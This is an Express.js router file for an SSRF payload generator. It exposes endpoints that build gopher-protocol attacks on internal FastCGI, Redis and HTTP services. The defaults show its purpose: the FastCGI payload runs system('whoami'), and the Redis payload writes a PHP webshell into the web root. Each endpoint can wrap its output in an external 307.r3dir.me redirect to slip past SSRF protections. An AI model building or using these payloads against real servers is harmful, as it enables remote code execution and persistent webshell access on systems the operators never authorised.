/**
 *
 * Notice: Machines with libcurl version after 7.65.2 do not support changing the protocol to gopher
 * on HTTP redirection by default.
 *
 * @link https://github.com/curl/curl/pull/4094
 * @link https://curl.se/libcurl/c/CURLOPT_REDIR_PROTOCOLS_STR.html
 * @link https://github.com/Esonhugh/Gopherus3/blob/main/gopherus3/module/FastCGI.py
 **/

const express = require('express');
const router = express.Router();
const { body } = require('express-validator');
const fastcgi = require('../utils/gopher/fastcgi');
const redis = require('../utils/gopher/redis');
const http = require('../utils/gopher/http');
const querystring = require('querystring');

router.post('/fastcgi', validate([
    body('host').optional(),
    body('port').optional().isNumeric().withMessage('Port must be a number')
        .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
    body('filename').optional().isString(),
    body('command').optional().isString(),
    body('urlencode').optional().isString(),
    body('r3dir').optional().isString(),
    body('suffix').optional().isString(),
]), async (req, res, next) => {
    try {
        fastcgi.host = req.body.host || '127.0.0.1';
        fastcgi.port = req.body.port || 9000;
        fastcgi.filename = req.body.filename || '/usr/share/php/PEAR.php';
        fastcgi.command = req.body.command || 'system("whoami");';

        let generated = fastcgi.generatePayload();
        if (req.body.urlencode) {
            generated = querystring.escape(generated);
        }
        generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
        if (req.body.r3dir) {
            if (req.body.suffix) {
                res.send("//307.r3dir.me/--to/?url=" + generated + "%23%2F" + req.body.suffix);
            } else {
                res.send("//307.r3dir.me/--to/?url=" + generated);
            }
        } else {
            res.send(generated);
        }
    } catch (error) {
        next(error);
    }
});

router.post('/redis', validate([
    body('host').optional(),
    body('port').optional().isNumeric().withMessage('Port must be a number')
        .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
    body('filename').optional().isString(),
    body('filepath').optional().isString(),
    body('content').optional().isString(),
    body('urlencode').optional().isString(),
    body('r3dir').optional().isString(),
    body('suffix').optional().isString(),
]), async (req, res, next) => {
    try {
        redis.host = req.body.host || '127.0.0.1';
        redis.port = req.body.port || '6379';
        redis.filepath = req.body.filepath || '/var/www/html';
        redis.filename = req.body.filename || 's.php';
        redis.content = req.body.content || '<?php evil($_POST["x"]);';

        let generated = redis.generatePayload();
        if (req.body.urlencode) {
            generated = querystring.escape(generated);
        }
        generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
        if (req.body.r3dir) {
            if (req.body.suffix) {
                res.send("//307.r3dir.me/--to/?url=" + generated + "%23%2F" + req.body.suffix);
            } else {
                res.send("//307.r3dir.me/--to/?url=" + generated);
            }
        } else {
            res.send(generated);
        }
    } catch (error) {
        next(error);
    }
});

router.post('/http', validate([
    body('host').optional(),
    body('port').optional().isNumeric().withMessage('Port must be a number')
        .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
    body('path').optional().isString(),
    body('method').optional().isString(),
    body('path').optional().isString(),
    body('type').optional().isString(),
    body('body').optional(),
    body('headers').optional().isObject().withMessage("Invalid JSON"),
    body('urlencode').optional().isString(),
    body('r3dir').optional().isString(),
    body('suffix').optional().isString(),
]), async (req, res, next) => {
    try {
        http.host = req.body.host || '127.0.0.1';
        http.port = req.body.port || '80';
        http.method = req.body.method || 'GET';
        http.path = req.body.path || '/';
        http.type = req.body.type || 'x-www-form-urlencoded';
        http.body = req.body.body || '';
        http.headers = req.body.headers || {};

        let generated = http.generatePayload();
        if (req.body.urlencode) {
            generated = querystring.escape(generated);
        }
        generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');
        if (req.body.r3dir) {
            if (req.body.suffix) {
                res.send("//307.r3dir.me/--to/?url=" + generated + "%23%2F" + req.body.suffix);
            } else {
                res.send("//307.r3dir.me/--to/?url=" + generated);
            }
        } else {
            res.send(generated);
        }
    } catch (error) {
        next(error);
    }
});

module.exports = router;
